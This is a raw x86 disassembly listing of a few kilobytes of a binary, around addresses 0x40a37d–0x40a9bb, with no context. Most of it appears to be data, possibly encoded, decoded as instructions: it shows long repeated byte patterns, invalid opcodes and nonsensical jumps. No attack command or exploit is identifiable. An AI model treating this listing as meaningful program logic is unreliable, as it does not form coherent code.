  40a37d:	a1 a0 48 95 f5       	mov    0xf59548a0,%eax
  40a382:	9f                   	lahf
  40a383:	5f                   	pop    %edi
  40a384:	58                   	pop    %eax
  40a385:	cc                   	int3
  40a386:	c8 a1 a0 48          	enter  $0xa0a1,$0x48
  40a38a:	8b f5                	mov    %ebp,%esi
  40a38c:	9f                   	lahf
  40a38d:	5f                   	pop    %edi
  40a38e:	58                   	pop    %eax
  40a38f:	c8 c8 a1 a0          	enter  $0xa1c8,$0xa0
  40a393:	48                   	dec    %eax
  40a394:	81 f5 9f 5f 58 c4    	xor    $0xc4585f9f,%ebp
  40a39a:	c8 a1 a0 48          	enter  $0xa0a1,$0x48
  40a39e:	77 f5                	ja     0x40a395
  40a3a0:	9f                   	lahf
  40a3a1:	5f                   	pop    %edi
  40a3a2:	58                   	pop    %eax
  40a3a3:	c0 c8 a1             	ror    $0xa1,%al
  40a3a6:	a0 48 6d f5 9f       	mov    0x9ff56d48,%al
  40a3ab:	5f                   	pop    %edi
  40a3ac:	58                   	pop    %eax
  40a3ad:	bc c8 a1 a0 48       	mov    $0x48a0a1c8,%esp
  40a3b2:	63 f5                	arpl   %esi,%ebp
  40a3b4:	9f                   	lahf
  40a3b5:	5f                   	pop    %edi
  40a3b6:	58                   	pop    %eax
  40a3b7:	b8 c8 a1 a0 48       	mov    $0x48a0a1c8,%eax
  40a3bc:	59                   	pop    %ecx
  40a3bd:	f5                   	cmc
  40a3be:	9f                   	lahf
  40a3bf:	5f                   	pop    %edi
  40a3c0:	58                   	pop    %eax
  40a3c1:	ac                   	lods   %ds:(%esi),%al
  40a3c2:	c8 a1 a0 eb          	enter  $0xa0a1,$0xeb
  40a3c6:	b5 34                	mov    $0x34,%ch
  40a3c8:	0f a0                	push   %fs
  40a3ca:	a0 48 59 fb 9f       	mov    0x9ffb5948,%al
  40a3cf:	5f                   	pop    %edi
  40a3d0:	58                   	pop    %eax
  40a3d1:	8c 48 a0             	mov    %cs,-0x60(%eax)
  40a3d4:	a0 19 a5 60 a0       	mov    0xa060a519,%al
  40a3d9:	60                   	pusha
  40a3da:	2b 75 a0             	sub    -0x60(%ebp),%esi
  40a3dd:	70 e0                	jo     0x40a3bf
  40a3df:	60                   	pusha
  40a3e0:	88 38                	mov    %bh,(%eax)
  40a3e2:	3b 5f 9f             	cmp    -0x61(%edi),%ebx
  40a3e5:	93                   	xchg   %eax,%ebx
  40a3e6:	60                   	pusha
  40a3e7:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40a3ec:	b0 c8                	mov    $0xc8,%al
  40a3ee:	11 ef                	adc    %ebp,%edi
  40a3f0:	e0 60                	loopne 0x40a452
  40a3f2:	63 49 65             	arpl   %ecx,0x65(%ecx)
  40a3f5:	f0 9f                	lock lahf
  40a3f7:	5f                   	pop    %edi
  40a3f8:	8b 58 fd             	mov    -0x3(%eax),%ebx
  40a3fb:	23 30                	and    (%eax),%esi
  40a3fd:	70 a0                	jo     0x40a39f
  40a3ff:	60                   	pusha
  40a400:	a0 dc 2f a0 a0       	mov    0xa0a02fdc,%al
  40a405:	f0 d3 a0 a0 b4 d3 a0 	lock shll %cl,-0x5f2c4b60(%eax)
  40a40c:	a0 d0 d1 a0 a0       	mov    0xa0a0d1d0,%al
  40a411:	94                   	xchg   %eax,%esp
  40a412:	d1 a0 a0 28 d3 a0    	shll   $1,-0x5f2cd760(%eax)
  40a418:	a0 f8 d3 a0 a0       	mov    0xa0a0d3f8,%al
  40a41d:	78 d5                	js     0x40a3f4
  40a41f:	a0 a0 48 d4 a0       	mov    0xa0d448a0,%al
  40a424:	a0 f0 e0 a0 a0       	mov    0xa0a0e0f0,%al
  40a429:	c0 e0 a0             	shl    $0xa0,%al
  40a42c:	a0 3c ee a0 a0       	mov    0xa0a0ee3c,%al
  40a431:	0c ee                	or     $0xee,%al
  40a433:	a0 a0 60 f9 a0       	mov    0xa0f960a0,%al
  40a438:	a0 30 f8 a0 a0       	mov    0xa0a0f830,%al
  40a43d:	00 f9                	add    %bh,%cl
  40a43f:	a0 a0 d0 f9 a0       	mov    0xa0f9d0a0,%al
  40a444:	a0 a8 f9 a0 a0       	mov    0xa0a0f9a8,%al
  40a449:	78 f9                	js     0x40a444
  40a44b:	a0 a0 90 fd a0       	mov    0xa0fd90a0,%al
  40a450:	a0 60 fd a0 a0       	mov    0xa0a0fd60,%al
  40a455:	3c fd                	cmp    $0xfd,%al
  40a457:	a0 a0 0c fd a0       	mov    0xa0fd0ca0,%al
  40a45c:	a0 78 07 a0 a0       	mov    0xa0a00778,%al
  40a461:	48                   	dec    %eax
  40a462:	06                   	push   %es
  40a463:	a0 a0 04 0f a0       	mov    0xa00f04a0,%al
  40a468:	a0 d4 0f a0 a0       	mov    0xa0a00fd4,%al
  40a46d:	10 0e                	adc    %cl,(%esi)
  40a46f:	a0 a0 e0 0e a0       	mov    0xa00ee0a0,%al
  40a474:	a0 90 15 a0 a0       	mov    0xa0a01590,%al
  40a479:	60                   	pusha
  40a47a:	15 a0 a0 60 a0       	adc    $0xa060a0a0,%eax
  40a47f:	60                   	pusha
  40a480:	a0 2c 2e a0 a0       	mov    0xa0a02e2c,%al
  40a485:	b5 2b                	mov    $0x2b,%ch
  40a487:	4c                   	dec    %esp
  40a488:	23 24 64             	and    (%esp,%eiz,2),%esp
  40a48b:	18 14 ef             	sbb    %dl,(%edi,%ebp,8)
  40a48e:	e0 60                	loopne 0x40a4f0
  40a490:	88 60 43             	mov    %ah,0x43(%eax)
  40a493:	5f                   	pop    %edi
  40a494:	9f                   	lahf
  40a495:	93                   	xchg   %eax,%ebx
  40a496:	60                   	pusha
  40a497:	b5 08                	mov    $0x8,%ch
  40a499:	88 30                	mov    %dh,(%eax)
  40a49b:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  40a4a0:	04 e9                	add    $0xe9,%al
  40a4a2:	c0 93 60 ba f9 b9 04 	rclb   $0x4,-0x460645a0(%ebx)
  40a4a9:	e9 b0 c8 cf f0       	jmp    0xf1106d5e
  40a4ae:	e0 60                	loopne 0x40a510
  40a4b0:	63 49 a7             	arpl   %ecx,-0x59(%ecx)
  40a4b3:	f0 9f                	lock lahf
  40a4b5:	5f                   	pop    %edi
  40a4b6:	8b 58 88             	mov    -0x78(%eax),%ebx
  40a4b9:	34 33                	xor    $0x33,%al
  40a4bb:	5f                   	pop    %edi
  40a4bc:	9f                   	lahf
  40a4bd:	60                   	pusha
  40a4be:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4c3:	60                   	pusha
  40a4c4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4c9:	60                   	pusha
  40a4ca:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4cf:	60                   	pusha
  40a4d0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4d5:	60                   	pusha
  40a4d6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4db:	60                   	pusha
  40a4dc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4e1:	60                   	pusha
  40a4e2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4e7:	60                   	pusha
  40a4e8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4ed:	60                   	pusha
  40a4ee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4f3:	60                   	pusha
  40a4f4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4f9:	60                   	pusha
  40a4fa:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a4ff:	60                   	pusha
  40a500:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a505:	60                   	pusha
  40a506:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a50b:	60                   	pusha
  40a50c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a511:	60                   	pusha
  40a512:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a517:	60                   	pusha
  40a518:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a51d:	60                   	pusha
  40a51e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a523:	60                   	pusha
  40a524:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a529:	60                   	pusha
  40a52a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a52f:	60                   	pusha
  40a530:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a535:	60                   	pusha
  40a536:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a53b:	60                   	pusha
  40a53c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a541:	60                   	pusha
  40a542:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a547:	60                   	pusha
  40a548:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a54d:	60                   	pusha
  40a54e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a553:	60                   	pusha
  40a554:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a559:	60                   	pusha
  40a55a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a55f:	60                   	pusha
  40a560:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a565:	60                   	pusha
  40a566:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a56b:	60                   	pusha
  40a56c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a571:	60                   	pusha
  40a572:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a577:	60                   	pusha
  40a578:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a57d:	60                   	pusha
  40a57e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a583:	60                   	pusha
  40a584:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a589:	60                   	pusha
  40a58a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a58f:	60                   	pusha
  40a590:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a595:	60                   	pusha
  40a596:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a59b:	60                   	pusha
  40a59c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5a1:	60                   	pusha
  40a5a2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5a7:	60                   	pusha
  40a5a8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5ad:	60                   	pusha
  40a5ae:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5b3:	60                   	pusha
  40a5b4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5b9:	60                   	pusha
  40a5ba:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5bf:	60                   	pusha
  40a5c0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5c5:	60                   	pusha
  40a5c6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5cb:	60                   	pusha
  40a5cc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5d1:	60                   	pusha
  40a5d2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5d7:	60                   	pusha
  40a5d8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5dd:	60                   	pusha
  40a5de:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5e3:	60                   	pusha
  40a5e4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5e9:	60                   	pusha
  40a5ea:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5ef:	60                   	pusha
  40a5f0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5f5:	60                   	pusha
  40a5f6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a5fb:	60                   	pusha
  40a5fc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a601:	60                   	pusha
  40a602:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a607:	60                   	pusha
  40a608:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a60d:	60                   	pusha
  40a60e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a613:	60                   	pusha
  40a614:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a619:	60                   	pusha
  40a61a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a61f:	60                   	pusha
  40a620:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a625:	60                   	pusha
  40a626:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a62b:	60                   	pusha
  40a62c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a631:	60                   	pusha
  40a632:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a637:	60                   	pusha
  40a638:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a63d:	60                   	pusha
  40a63e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a643:	60                   	pusha
  40a644:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a649:	60                   	pusha
  40a64a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a64f:	60                   	pusha
  40a650:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a655:	60                   	pusha
  40a656:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a65b:	60                   	pusha
  40a65c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a661:	60                   	pusha
  40a662:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a667:	60                   	pusha
  40a668:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a66d:	60                   	pusha
  40a66e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a673:	60                   	pusha
  40a674:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a679:	60                   	pusha
  40a67a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a67f:	60                   	pusha
  40a680:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a685:	60                   	pusha
  40a686:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a68b:	60                   	pusha
  40a68c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a691:	60                   	pusha
  40a692:	a0 60 a0 62 2d       	mov    0x2d62a060,%al
  40a697:	a0 a0 92 b3 eb       	mov    0xebb392a0,%al
  40a69c:	60                   	pusha
  40a69d:	60                   	pusha
  40a69e:	2d a0 a0 60 2d       	sub    $0x2d60a0a0,%eax
  40a6a3:	a0 a0 61 2d a0       	mov    0xa02d61a0,%al
  40a6a8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a6ad:	60                   	pusha
  40a6ae:	a0 60 a0 30 d0       	mov    0xd030a060,%al
  40a6b3:	a0 a0 80 cc a0       	mov    0xa0cc80a0,%al
  40a6b8:	a0 80 cc a0 a0       	mov    0xa0a0cc80,%al
  40a6bd:	00 c2                	add    %al,%dl
  40a6bf:	a0 a0 cc c2 a0       	mov    0xa0c2cca0,%al
  40a6c4:	a0 80 cc a0 a0       	mov    0xa0a0cc80,%al
  40a6c9:	80 cc a0             	or     $0xa0,%ah
  40a6cc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a6d1:	d0 b1 a0 a0 e4 b1    	shlb   $1,-0x4e1b5f60(%ecx)
  40a6d7:	a0 a0 08 b1 a0       	mov    0xa0b108a0,%al
  40a6dc:	a0 60 6b 2c 68       	mov    0x682c6b60,%al
  40a6e1:	29 77 2f             	sub    %esi,0x2f(%edi)
  40a6e4:	68 2d 6e 3b 78       	push   $0x783b6e2d
  40a6e9:	2a 79 3a             	sub    0x3a(%ecx),%bh
  40a6ec:	7c 3d                	jl     0x40a72b
  40a6ee:	7e 3f                	jle    0x40a72f
  40a6f0:	80 41 83 60          	addb   $0x60,-0x7d(%ecx)
  40a6f4:	84 45 2d             	test   %al,0x2d(%ebp)
  40a6f7:	a0 a0 63 a0 60       	mov    0x60a063a0,%al
  40a6fc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a701:	61                   	popa
  40a702:	a0 60 a0 62 a0       	mov    0xa062a060,%al
  40a707:	60                   	pusha
  40a708:	a0 63 a0 60 a0       	mov    0xa060a063,%al
  40a70d:	60                   	pusha
  40a70e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a713:	60                   	pusha
  40a714:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a719:	80 cc a0             	or     $0xa0,%ah
  40a71c:	a0 80 cc a0 a0       	mov    0xa0a0cc80,%al
  40a721:	20 d1                	and    %dl,%cl
  40a723:	a0 a0 5f 9f 5f       	mov    0x5f9f5fa0,%al
  40a728:	9f                   	lahf
  40a729:	60                   	pusha
  40a72a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a72f:	60                   	pusha
  40a730:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a735:	60                   	pusha
  40a736:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a73b:	60                   	pusha
  40a73c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a741:	fc                   	cld
  40a742:	d2 a0 a0 a8 d2 a0    	shlb   %cl,-0x5f2d5760(%eax)
  40a748:	a0 64 d2 a0 a0       	mov    0xa0a0d264,%al
  40a74d:	d4 d2                	aam    $0xd2
  40a74f:	a0 a0 a1 e2 a3       	mov    0xa3e2a1a0,%al
  40a754:	e4 a5                	in     $0xa5,%al
  40a756:	e6 a7                	out    %al,$0xa7
  40a758:	e8 a9 ea ab ec       	call   0xecec9206
  40a75d:	ad                   	lods   %ds:(%esi),%eax
  40a75e:	ee                   	out    %al,(%dx)
  40a75f:	af                   	scas   %es:(%edi),%eax
  40a760:	f0 b1 f2             	lock mov $0xf2,%cl
  40a763:	b3 f4                	mov    $0xf4,%bl
  40a765:	b5 f6                	mov    $0xf6,%ch
  40a767:	b7 f8                	mov    $0xf8,%bh
  40a769:	b9 fa c1 02 c3       	mov    $0xc302c1fa,%ecx
  40a76e:	04 c5                	add    $0xc5,%al
  40a770:	06                   	push   %es
  40a771:	c7                   	(bad)
  40a772:	08 c9                	or     %cl,%cl
  40a774:	0a cb                	or     %bl,%cl
  40a776:	0c cd                	or     $0xcd,%al
  40a778:	0e                   	push   %cs
  40a779:	cf                   	iret
  40a77a:	10 d1                	adc    %dl,%cl
  40a77c:	12 d3                	adc    %bl,%dl
  40a77e:	14 d5                	adc    $0xd5,%al
  40a780:	16                   	push   %ss
  40a781:	d7                   	xlat   %ds:(%ebx)
  40a782:	18 d9                	sbb    %bl,%cl
  40a784:	1a 90 d1 92 d3 94    	sbb    -0x6b2c6d2f(%eax),%dl
  40a78a:	d5 96                	aad    $0x96
  40a78c:	d7                   	xlat   %ds:(%ebx)
  40a78d:	98                   	cwtl
  40a78e:	d9 8b cf 60 a0 60    	(bad) 0x60a060cf(%ebx)
  40a794:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a799:	60                   	pusha
  40a79a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a79f:	60                   	pusha
  40a7a0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a7a5:	60                   	pusha
  40a7a6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a7ab:	60                   	pusha
  40a7ac:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a7b1:	60                   	pusha
  40a7b2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a7b7:	60                   	pusha
  40a7b8:	a0 60 a0 60 de       	mov    0xde60a060,%al
  40a7bd:	60                   	pusha
  40a7be:	a0 60 df 94 d5       	mov    0xd594df60,%al
  40a7c3:	96                   	xchg   %eax,%esi
  40a7c4:	d7                   	xlat   %ds:(%ebx)
  40a7c5:	98                   	cwtl
  40a7c6:	d9 9a db 9c dd 60    	fstps  0x60dd9cdb(%edx)
  40a7cc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a7d1:	60                   	pusha
  40a7d2:	a0 61 a2 63 a4       	mov    0xa463a261,%al
  40a7d7:	65 a6                	cmpsb  %es:(%edi),%gs:(%esi)
  40a7d9:	67 a8 69             	addr16 test $0x69,%al
  40a7dc:	aa                   	stos   %al,%es:(%edi)
  40a7dd:	6b ac 6d ae 6f b0 71 	imul   $0xffffffb2,0x71b06fae(%ebp,%ebp,2),%ebp
  40a7e4:	b2 
  40a7e5:	73 b4                	jae    0x40a79b
  40a7e7:	75 b6                	jne    0x40a79f
  40a7e9:	77 b8                	ja     0x40a7a3
  40a7eb:	79 a0                	jns    0x40a78d
  40a7ed:	60                   	pusha
  40a7ee:	a0 60 a0 60 ba       	mov    0xba60a060,%al
  40a7f3:	7b bc                	jnp    0x40a7b1
  40a7f5:	7d be                	jge    0x40a7b5
  40a7f7:	7f c0                	jg     0x40a7b9
  40a7f9:	81 c2 83 c4 85 c6    	add    $0xc685c483,%edx
  40a7ff:	87 c8                	xchg   %ecx,%eax
  40a801:	89 ca                	mov    %ecx,%edx
  40a803:	8b cc                	mov    %esp,%ecx
  40a805:	8d                   	lea    (bad),%ecx
  40a806:	ce                   	into
  40a807:	8f                   	(bad)
  40a808:	d0 91 d2 93 a0 60    	rclb   $1,0x60a093d2(%ecx)
  40a80e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a813:	60                   	pusha
  40a814:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a819:	60                   	pusha
  40a81a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a81f:	60                   	pusha
  40a820:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a825:	60                   	pusha
  40a826:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a82b:	60                   	pusha
  40a82c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a831:	60                   	pusha
  40a832:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a837:	60                   	pusha
  40a838:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a83d:	60                   	pusha
  40a83e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a843:	60                   	pusha
  40a844:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a849:	60                   	pusha
  40a84a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a84f:	60                   	pusha
  40a850:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a855:	60                   	pusha
  40a856:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a85b:	60                   	pusha
  40a85c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a861:	60                   	pusha
  40a862:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a867:	60                   	pusha
  40a868:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a86d:	60                   	pusha
  40a86e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a873:	60                   	pusha
  40a874:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a879:	60                   	pusha
  40a87a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a87f:	60                   	pusha
  40a880:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a885:	60                   	pusha
  40a886:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a88b:	60                   	pusha
  40a88c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a891:	60                   	pusha
  40a892:	a0 60 a0 60 a5       	mov    0xa560a060,%al
  40a897:	eb 60                	jmp    0x40a8f9
  40a899:	60                   	pusha
  40a89a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a89f:	60                   	pusha
  40a8a0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a8a5:	60                   	pusha
  40a8a6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a8ab:	60                   	pusha
  40a8ac:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a8b1:	60                   	pusha
  40a8b2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40a8b7:	60                   	pusha
  40a8b8:	a0 61 a1 61 a1       	mov    0xa161a161,%al
  40a8bd:	61                   	popa
  40a8be:	a1 61 a1 61 a1       	mov    0xa161a161,%eax
  40a8c3:	61                   	popa
  40a8c4:	a1 61 a1 61 a1       	mov    0xa161a161,%eax
  40a8c9:	62 a2 62 a2 62 a2    	bound  %esp,-0x5d9d5d9e(%edx)
  40a8cf:	62 a2 62 a2 62 a2    	bound  %esp,-0x5d9d5d9e(%edx)
  40a8d5:	62 a2 62 a2 63 a3    	bound  %esp,-0x5c9c5d9e(%edx)
  40a8db:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a8e1:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a8e7:	63 a3 64 a4 64 a4    	arpl   %esp,-0x5b9b5b9c(%ebx)
  40a8ed:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a8ef:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a8f1:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a8f3:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a8f5:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a8f7:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a8f9:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40a8fb:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40a8fd:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40a8ff:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40a901:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40a903:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40a905:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40a907:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40a909:	68 a8 68 a8 68       	push   $0x68a868a8
  40a90e:	a8 68                	test   $0x68,%al
  40a910:	a8 69                	test   $0x69,%al
  40a912:	a9 69 a9 69 a9       	test   $0xa969a969,%eax
  40a917:	69 a9 6a aa 6a aa 6a 	imul   $0xaa6aaa6a,-0x55955596(%ecx),%ebp
  40a91e:	aa 6a aa 
  40a921:	6b ab 6b ab 6b ab 6b 	imul   $0x6b,-0x54945495(%ebx),%ebp
  40a928:	ab                   	stos   %eax,%es:(%edi)
  40a929:	6c                   	insb   (%dx),%es:(%edi)
  40a92a:	ac                   	lods   %ds:(%esi),%al
  40a92b:	6c                   	insb   (%dx),%es:(%edi)
  40a92c:	ac                   	lods   %ds:(%esi),%al
  40a92d:	6d                   	insl   (%dx),%es:(%edi)
  40a92e:	ad                   	lods   %ds:(%esi),%eax
  40a92f:	6d                   	insl   (%dx),%es:(%edi)
  40a930:	ad                   	lods   %ds:(%esi),%eax
  40a931:	6e                   	outsb  %ds:(%esi),(%dx)
  40a932:	ae                   	scas   %es:(%edi),%al
  40a933:	6e                   	outsb  %ds:(%esi),(%dx)
  40a934:	ae                   	scas   %es:(%edi),%al
  40a935:	6f                   	outsl  %ds:(%esi),(%dx)
  40a936:	af                   	scas   %es:(%edi),%eax
  40a937:	6f                   	outsl  %ds:(%esi),(%dx)
  40a938:	af                   	scas   %es:(%edi),%eax
  40a939:	70 b0                	jo     0x40a8eb
  40a93b:	70 b0                	jo     0x40a8ed
  40a93d:	71 b1                	jno    0x40a8f0
  40a93f:	71 b1                	jno    0x40a8f2
  40a941:	72 b2                	jb     0x40a8f5
  40a943:	72 b2                	jb     0x40a8f7
  40a945:	73 b3                	jae    0x40a8fa
  40a947:	73 b3                	jae    0x40a8fc
  40a949:	74 b4                	je     0x40a8ff
  40a94b:	74 b4                	je     0x40a901
  40a94d:	75 b5                	jne    0x40a904
  40a94f:	75 b5                	jne    0x40a906
  40a951:	76 b6                	jbe    0x40a909
  40a953:	76 b6                	jbe    0x40a90b
  40a955:	77 b7                	ja     0x40a90e
  40a957:	77 b7                	ja     0x40a910
  40a959:	78 b8                	js     0x40a913
  40a95b:	79 b9                	jns    0x40a916
  40a95d:	7a ba                	jp     0x40a919
  40a95f:	7b bb                	jnp    0x40a91c
  40a961:	7c bc                	jl     0x40a91f
  40a963:	7d bd                	jge    0x40a922
  40a965:	7e be                	jle    0x40a925
  40a967:	7f bf                	jg     0x40a928
  40a969:	80 c0 81             	add    $0x81,%al
  40a96c:	c1 82 c2 83 c3 84 c4 	roll   $0xc4,-0x7b3c7c3e(%edx)
  40a973:	85 c5                	test   %eax,%ebp
  40a975:	86 c6                	xchg   %al,%dh
  40a977:	87 c7                	xchg   %eax,%edi
  40a979:	88 c8                	mov    %cl,%al
  40a97b:	89 c9                	mov    %ecx,%ecx
  40a97d:	8a ca                	mov    %dl,%cl
  40a97f:	8b cb                	mov    %ebx,%ecx
  40a981:	8c cc                	mov    %cs,%esp
  40a983:	8d                   	lea    (bad),%ecx
  40a984:	cd 8e                	int    $0x8e
  40a986:	ce                   	into
  40a987:	8f                   	(bad)
  40a988:	cf                   	iret
  40a989:	90                   	nop
  40a98a:	d1 92 d3 94 d5 96    	rcll   $1,-0x692a6b2d(%edx)
  40a990:	d7                   	xlat   %ds:(%ebx)
  40a991:	98                   	cwtl
  40a992:	d9 9a db 9c dd 9e    	fstps  -0x61226325(%edx)
  40a998:	df 63 a3             	fbld   -0x5d(%ebx)
  40a99b:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a9a1:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a9a7:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a9ad:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a9b3:	63 a3 63 a3 63 a3    	arpl   %esp,-0x5c9c5c9d(%ebx)
  40a9b9:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9bb:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
